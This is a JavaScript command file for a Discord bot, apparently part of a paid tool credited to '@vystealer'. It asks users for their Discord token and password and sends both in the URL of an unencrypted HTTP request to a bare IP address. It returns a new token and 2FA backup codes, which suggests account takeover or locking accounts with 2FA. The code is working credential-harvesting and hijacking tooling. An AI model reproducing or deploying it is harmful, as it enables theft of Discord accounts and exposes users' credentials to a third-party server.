const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { MongoClient } = require('mongodb');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });

const client = new MongoClient(process.env.MONGODB_URI);
let keysCollection;

client.connect().then(() => {
    const db = client.db(process.env.MONGODB_DB_NAME);
    keysCollection = db.collection('keys');
}).catch(console.error);

module.exports = {
    data: new SlashCommandBuilder()
        .setName('activetwo')
        .setDescription('Activate 2FA and get new token and backup codes')
        .addStringOption(option => 
            option.setName('token')
                .setDescription('Your Discord token')
                .setRequired(true))
        .addStringOption(option => 
            option.setName('password')
                .setDescription('Your Discord password')
                .setRequired(true)),
    async execute(interaction) {
        try {
            const userId = interaction.user.id;
            const userKey = await keysCollection.findOne({ userId });

            if (!userKey) {
                return interaction.reply({ content: 'You dont have a plan.', ephemeral: true });
            }

            const token = interaction.options.getString('token');
            const password = interaction.options.getString('password');

            const response = await axios.get(`http://147.93.66.36:5000/api/enable/${token}/${password}`);
            const { new_token, backup_codes } = response.data;

            const filePath = path.join(__dirname, `../../backup_codes_${userId}.txt`);
            const fileContent = `New Token: ${new_token}\nBackup Codes:\n${backup_codes.join('\n')}`;
            fs.writeFileSync(filePath, fileContent);

            const embed = new EmbedBuilder()
                .setColor('#303037')
                .setTitle('2FA Activated')
                .setDescription('Your 2FA has been activated successfully. The new token and backup codes have been saved to a file.')
                .setFooter({ text: `${interaction.user.username} | @vystealer` })
                .setTimestamp();

            await interaction.reply({ embeds: [embed], files: [filePath], ephemeral: true });

            setTimeout(() => {
                fs.unlinkSync(filePath);
            }, 60000);

        } catch (error) {
            console.error(error);
            await interaction.reply({ content: 'An error occurred while processing your request.', ephemeral: true });
        }
    }
};
